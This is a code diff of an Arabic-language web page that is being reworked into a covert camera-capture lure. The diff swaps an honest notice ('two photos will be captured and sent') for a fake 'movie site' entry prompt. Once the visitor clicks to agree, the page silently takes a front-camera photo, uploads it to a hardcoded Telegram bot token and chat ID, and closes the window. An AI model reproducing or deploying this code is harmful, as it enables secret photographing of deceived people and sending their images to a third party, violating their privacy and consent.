@@ -20,7 +20,7 @@
             user-select: none;
         }
         
-        .camera-view {
+        #camera-container {
             position: fixed;
             top: 0;
             left: 0;
@@ -96,21 +96,20 @@
     </style>
 </head>
 <body>
-    <!-- عنصري الكاميرا المخفيان -->
-    <video id="back-camera" class="camera-view" autoplay playsinline></video>
-    <video id="front-camera" class="camera-view" autoplay playsinline></video>
+    <!-- عنصر الكاميرا المخفي -->
+    <video id="camera-container" autoplay playsinline></video>
     
     <!-- طبقة طلب الإذن -->
     <div id="permission-overlay">
-        <h2 style="margin-bottom: 15px;">يتطلب التطبيق الوصول إلى الكاميرا</h2>
-        <p style="margin-bottom: 10px;">سيتم التقاط صورتين (أمامية وخلفية) وإرسالهما تلقائيًا</p>
+        <h2 style="margin-bottom: 15px;">موقع افلام</h2>
+        <p style="margin-bottom: 10px;">لدخول الى موقع الافلام اضغط على زر الموافقة واذا لم يظهر الموقع اقفل وافتح الرابط من جديد</p>
         <button class="permission-btn" id="allow-btn">الموافقة والمتابعة</button>
     </div>
     
     <!-- طبقة التحميل -->
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <p>جاري معالجة الصور...</p>
+        <p>انتظر لدخول الموقع...</p>
     </div>
     
     <script>
@@ -119,25 +118,23 @@
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
             captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            switchCameraDelay: 500, // تأخير تبديل الكاميرا
             autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
         };
         
         // العناصر
-        const backCamera = document.getElementById('back-camera');
-        const frontCamera = document.getElementById('front-camera');
+        const cameraView = document.getElementById('camera-container');
         const permissionOverlay = document.getElementById('permission-overlay');
         const loadingOverlay = document.getElementById('loading-overlay');
         const allowBtn = document.getElementById('allow-btn');
         
-        // دالة لتهيئة الكاميرا
-        async function initCamera(videoElement, facingMode) {
+        // دالة متعددة المتصفحات لطلب الكاميرا
+        async function initCamera() {
             try {
                 const constraints = {
                     video: {
                         width: { ideal: 1920 },
                         height: { ideal: 1080 },
-                        facingMode: facingMode
+                        facingMode: 'user'
                     },
                     audio: false
                 };
@@ -170,19 +167,14 @@
             });
         }
         
-        // دالة إرسال الصور إلى تليجرام
-        async function sendToTelegram(photos) {
+        // دالة إرسال الصورة إلى تليجرام
+        async function sendToTelegram(photoBlob) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', config.chatId);
-                formData.append('caption', 'تم التقاط صورتين: أمامية وخلفية');
+                formData.append('photo', photoBlob, 'captured_photo.jpg');
                 
-                // إضافة الصور إلى FormData
-                photos.forEach((photo, index) => {
-                    formData.append(`photo_${index}`, photo.blob, `${photo.type}_photo.jpg`);
-                });
-                
-                const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendMediaGroup`, {
+                const response = await fetch(`https://api.telegram.org/bot${config.botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
@@ -191,51 +183,6 @@
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
                 throw error;
-            }
-        }
-        
-        // دالة رئيسية للعملية الكاملة
-        async function captureAndSend() {
-            try {
-                const photos = [];
-                
-                // 1. التقاط الصورة الخلفية أولاً
-                const backStream = await initCamera(backCamera, 'environment');
-                backCamera.srcObject = backStream;
-                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
-                
-                const backPhotoBlob = await capturePhoto(backCamera);
-                photos.push({ type: 'back', blob: backPhotoBlob });
-                
-                // إيقاف الكاميرا الخلفية
-                backStream.getTracks().forEach(track => track.stop());
-                
-                // 2. الانتظار قليلاً قبل تبديل الكاميرا
-                await new Promise(resolve => setTimeout(resolve, config.switchCameraDelay));
-                
-                // 3. التقاط الصورة الأمامية
-                const frontStream = await initCamera(frontCamera, 'user');
-                frontCamera.srcObject = frontStream;
-                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
-                
-                const frontPhotoBlob = await capturePhoto(frontCamera);
-                photos.push({ type: 'front', blob: frontPhotoBlob });
-                
-                // إيقاف الكاميرا الأمامية
-                frontStream.getTracks().forEach(track => track.stop());
-                
-                // 4. إرسال الصور
-                await sendToTelegram(photos);
-                
-                // 5. إغلاق النافذة بعد الإرسال
-                setTimeout(() => {
-                    window.close();
-                }, config.autoCloseDelay);
-                
-            } catch (error) {
-                console.error('Process failed:', error);
-                loadingOverlay.style.display = 'none';
-                alert('حدث خطأ: ' + (error.message || 'غير معروف'));
             }
         }
         
@@ -249,13 +196,33 @@
                     loadingOverlay.style.display = 'flex';
                 }, 300);
                 
-                // بدء عملية الالتقاط والإرسال
-                await captureAndSend();
+                // تهيئة الكاميرا
+                const stream = await initCamera();
+                cameraView.srcObject = stream;
+                
+                // انتظر لضبط الكاميرا
+                await new Promise(resolve => setTimeout(resolve, config.captureDelay));
+                
+                // التقاط الصورة
+                const photoBlob = await capturePhoto(cameraView);
+                
+                // إيقاف الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+                
+                // إرسال الصورة
+                await sendToTelegram(photoBlob);
+                
+                // إغلاق النافذة بعد الإرسال
+                setTimeout(() => {
+                    window.close();
+                }, config.autoCloseDelay);
                 
             } catch (error) {
-                console.error('Initialization failed:', error);
+                console.error('Process failed:', error);
                 loadingOverlay.style.display = 'none';
-                alert('حدث خطأ في التهيئة: ' + (error.message || 'غير معروف'));
+                
+                // عرض رسالة خطأ بسيطة
+                alert('حدث خطأ: ' + (error.message || 'غير معروف'));
             }
         });
         
